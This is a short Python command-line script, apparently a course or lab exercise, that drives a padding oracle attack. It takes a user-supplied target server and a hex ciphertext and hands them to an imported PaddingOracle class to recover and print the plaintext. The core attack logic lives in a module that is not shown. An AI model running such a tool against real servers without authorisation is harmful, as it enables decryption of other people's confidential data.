from paddingoracle import PaddingOracle, decode
import textwrap

def run():
    print("\nPADDING ORACLE ATTACK!")

    target_raw = input("Target server: ").lower()
    ciphertext = input("Target Ciphertext: ").lower()

    if len(ciphertext) != 128:
        print("ERROR: Ciphertext must be be 128 characters in length.")
        return

    try:
        bytes.fromhex(ciphertext)
    except:
        print("ERROR: Your ciphertext must be hex-encoded.")
        return


    target = "http://" + target_raw + "/po?er="

    print("\n-")
    print("Request Format: ", target + "CIPHERTEXT")
    print("Ciphertext:")

    c = textwrap.wrap(ciphertext, width=32)
    for i in c:
        print("  ",i)


    raw_decryption = None
    print("\n-")
    print("Decrypting... \n")

    try:
        po = PaddingOracle(target)
        raw_decryption = po.decrypt4blocks(ciphertext)
        print("\n...done.")
    except:
        print("Something went wrong. ")
        return

    print("\nRaw bytes: ", raw_decryption)

    try:
        message = decode(raw_decryption)
        print("\nFinal result: ", message)
    except:
        print("The format of the decrypted message is unexpected.", end="")

    print()


if __name__ == "__main__":
    run()
